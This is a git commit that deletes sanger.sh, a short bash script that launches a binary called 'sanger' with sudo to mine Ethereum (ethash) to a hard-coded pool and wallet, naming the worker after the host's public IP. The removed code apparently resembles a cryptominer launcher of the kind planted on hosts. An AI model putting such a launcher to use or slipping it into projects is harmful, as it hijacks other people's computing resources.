7ea41916eef94e1aa685baddbeac8e66b06f3b6f
ica02 <78954945+ica02@users.noreply.github.com>
2021-02-14 18:02:25 +0700

    Delete sanger.sh

--- sanger.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-POOL=asia.sparkpool.com:3333
-WALLET=0x2dd9a734ffe4c75bbae173a13a5019b962eb1b76
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-sgr
-
-cd "$(dirname "$0")"
-
-chmod +x ./sanger && sudo ./sanger -a ethash -o $POOL -u $WALLET.$WORKER $@
